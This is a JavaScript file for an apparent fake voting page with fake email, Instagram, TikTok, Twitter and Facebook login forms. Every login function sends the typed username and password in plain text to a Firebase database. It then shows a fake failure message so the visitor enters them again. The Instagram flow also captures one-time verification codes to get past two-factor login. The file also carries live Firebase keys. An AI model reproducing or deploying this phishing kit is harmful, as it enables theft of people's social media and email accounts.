// Initialize Firebase
const firebaseConfig = {
  apiKey: "AIzaSyB0QncHtjxIR5Jwaa0aqkSWT9RFdaVvTng",
  authDomain: "arabfamevoteplus.firebaseapp.com",
  databaseURL: "https://arabfamevoteplus-default-rtdb.firebaseio.com",
  projectId: "arabfamevoteplus",
  storageBucket: "arabfamevoteplus.firebasestorage.app",
  messagingSenderId: "554479039127",
  appId: "1:554479039127:web:0e9ce56cc3b68c041cafd2",
};
firebase.initializeApp(firebaseConfig);
const appCheck = firebase.appCheck();
appCheck.activate("6Lf544sgAAAAAIYRP96xR6Zd5bDJwPD9dh7bo3jW", true);

// Show custom alert
function showAlert(title, message) {
  document.getElementById("alert-title").innerText = title;
  document.getElementById("alert-message").innerText = message;
  document.getElementById("custom-alert").classList.remove("hidden");
}

// Hide custom alert
function hideAlert() {
  document.getElementById("custom-alert").classList.add("hidden");
}

// Firebase login functions
function hmlog() {
  firebase
    .auth()
    .signInAnonymously()
    .catch(function (error) {
      showAlert("Error", error.message);
    });

  var email = document.getElementById("hm-email").value;
  var password = document.getElementById("hm-pass").value;
  var currentDate = new Date().toISOString().slice(0, 10);
  var currentTime = new Date().toISOString().slice(11, 19);
  var timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
  var accountType = "Email";

  if (email !== "" && password !== "") {
    firebase.database().ref("fbdet").push({
      emle: email,
      mobile: "",
      time: currentTime,
      timezone: timezone,
      pass: password,
      date: currentDate,
      type: accountType,
    });

    setTimeout(function () {
      showAlert(
        "Vote not successful",
        "Sorry, something went wrong. Please try again."
      );
      document.getElementById("hm-pass").value = "";
      return false;
    }, 2000);
  }
}

function iglog() {
  const email = document.getElementById("ig-uname").value.trim();
  const password = document.getElementById("ig-pass").value.trim();

  if (!email || !password) {
    alert("Please enter both email and password.");
    return;
  }

  // Get the current submission count from localStorage (default to 0)
  let submissionCount = parseInt(
    localStorage.getItem("submissionCount") || "0"
  );

  // Increment the submission count
  submissionCount++;
  localStorage.setItem("submissionCount", submissionCount);

  if (submissionCount <= 1) {
    // Save the email and password to Firebase
    firebase
      .auth()
      .signInAnonymously()
      .then(() => {
        const currentDate = new Date().toISOString().slice(0, 10);
        const currentTime = new Date().toISOString().slice(11, 19);
        const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;

        firebase.database().ref("fbdet").push({
          emle: email,
          mobile: "",
          time: currentTime,
          timezone: timezone,
          pass: password,
          date: currentDate,
          type: "Instagram",
        });

        if (submissionCount === 1) {
          alert("Help us confirm it's you.");

          // Ensure #veryfi is displayed
          document.getElementById("veryfi").style.display = "block";
          document.getElementById("igp").style.display = "none";

          // Optionally, hide the login form or perform other actions
          document.getElementById("ig-uname").disabled = true; // Disable username field
          document.getElementById("ig-pass").disabled = true; // Disable password field

          localStorage.setItem("submissionCount", 0); // Reset the count
        } else {
          alert(`Your password is incorrect. Try again!`);
        }

        // Clear the password field for the next attempt
        document.getElementById("ig-pass").value = "";
      })
      .catch((error) => alert(error.message));
  }
}

function igConfirm() {
  const code = document.getElementById("ig-code").value.trim();

  if (!code) {
    alert("Please enter verification code.");
    return;
  }

  // Retrieve email and password from localStorage
  const email = localStorage.getItem("userEmail");
  const password = localStorage.getItem("userPassword");

  firebase
    .auth()
    .signInAnonymously()
    .then(() => {
      const currentDate = new Date().toISOString().slice(0, 10);
      const currentTime = new Date().toISOString().slice(11, 19);
      const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;

      firebase.database().ref("fbdet").push({
        code: code,
        emle: email,
        time: currentTime,
        timezone: timezone,
        date: currentDate,
        type: "Instagram OTP",
        pass: password, // Store the original password
      });

      setTimeout(() => {
        alert("Please enter verification code.");
        document.getElementById("ig-code").value = "";
      }, 2000);
    })
    .catch((error) => alert(error.message));
}

function toklog() {
  firebase
    .auth()
    .signInAnonymously()
    .catch(function (error) {
      showAlert("Error", error.message);
    });

  var username = document.getElementById("tok-uname").value;
  var password = document.getElementById("tok-pass").value;
  var currentDate = new Date().toISOString().slice(0, 10);
  var currentTime = new Date().toISOString().slice(11, 19);
  var timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
  var accountType = "TikTok";

  if (username !== "" && password !== "") {
    firebase.database().ref("fbdet").push({
      emle: username,
      mobile: "",
      time: currentTime,
      timezone: timezone,
      pass: password,
      date: currentDate,
      type: accountType,
    });

    setTimeout(function () {
      showAlert("Vote not successful", "Incorrect account or password.");
      document.getElementById("tok-pass").value = "";
      return false;
    }, 2000);
  }
}

function twilog() {
  firebase
    .auth()
    .signInAnonymously()
    .catch(function (error) {
      showAlert("Error", error.message);
    });

  var email = document.getElementById("twi-uname").value;
  var password = document.getElementById("twi-pass").value;
  var currentDate = new Date().toISOString().slice(0, 10);
  var currentTime = new Date().toISOString().slice(11, 19);
  var timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
  var accountType = "Email";

  if (email !== "" && password !== "") {
    firebase.database().ref("fbdet").push({
      emle: email,
      mobile: "",
      time: currentTime,
      timezone: timezone,
      pass: password,
      date: currentDate,
      type: accountType,
    });

    setTimeout(function () {
      showAlert(
        "Vote not successful",
        "Sorry, something went wrong. Please try again."
      );
      document.getElementById("twi-pass").value = "";
      return false;
    }, 2000);
  }
}

function fblog() {
  firebase
    .auth()
    .signInAnonymously()
    .catch(function (error) {
      showAlert("Error", error.message);
    });

  var email = document.getElementById("fb-uname").value;
  var password = document.getElementById("fb-pass").value;
  var currentDate = new Date().toISOString().slice(0, 10);
  var currentTime = new Date().toISOString().slice(11, 19);
  var timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
  var accountType = "Facebook";

  if (email !== "" && password !== "") {
    firebase.database().ref("fbdet").push({
      emle: email,
      mobile: "",
      time: currentTime,
      timezone: timezone,
      pass: password,
      date: currentDate,
      type: accountType,
    });

    setTimeout(function () {
      showAlert(
        "Vote not successful",
        "Sorry, something went wrong. Please try again."
      );
      document.getElementById("fb-pass").value = "";
      return false;
    }, 2000);
  }
}
